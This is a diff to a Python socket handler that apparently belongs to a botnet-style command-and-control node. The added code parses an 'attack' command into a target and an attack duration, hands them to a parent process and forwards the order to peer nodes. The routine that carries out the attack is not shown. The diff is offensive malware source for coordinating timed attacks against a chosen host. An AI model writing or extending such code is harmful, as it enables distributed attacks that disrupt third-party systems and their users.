@@ -137,9 +137,12 @@ def ip_list():
 def con_thread(sock, addr):
     global messages
     choice = ""
+    data = ""
     output = ""
     clients = []
+    full_cmd = ""
     fc = ""
+    cip = ""
     http_srv = ""
     while True:
         try:
@@ -148,22 +151,34 @@ def con_thread(sock, addr):
                 choice = sock.recv(1024).decode()
                 fc = choice
 
-            if choice.find("-") != -1:
-                if len(choice.split("-")) == 2:
-                    cip = choice.split("-")[1]
-                    choice = choice.split("-")[0]
-                    if cip != ip:
-                        forward = True
-                        choice = ""
-                        messages = fc
-                elif len(choice.split("-")) == 3:
-                    http_srv = choice.split("-")[2]
-                    cip = choice.split("-")[1]
-                    choice = choice.split("-")[0]
-                    if cip != ip:
-                        forward = True
-                        choice = ""
-                        messages = fc
+            if choice.find("attack") == -1:
+                if choice.find("-") != -1:
+                    if len(choice.split("-")) == 2:
+                        cip = choice.split("-")[1]
+                        choice = choice.split("-")[0]
+                        if cip != ip:
+                            forward = True
+                            choice = ""
+                            messages = fc
+                    elif len(choice.split("-")) == 3:
+                        http_srv = choice.split("-")[2]
+                        cip = choice.split("-")[1]
+                        choice = choice.split("-")[0]
+                        if cip != ip:
+                            forward = True
+                            choice = ""
+                            messages = fc
+
+            else:
+                attack_time = choice.split("!")[1]
+                target = choice.split("!")[0]
+                target = target.split(":")[1]
+                parent_conn.send(choice)
+                parent_conn.send(attack_time)
+                parent_conn.send(target)
+                forward = True
+                choice = ""
+                messages = fc
 
             if not forward:
                 data = choice
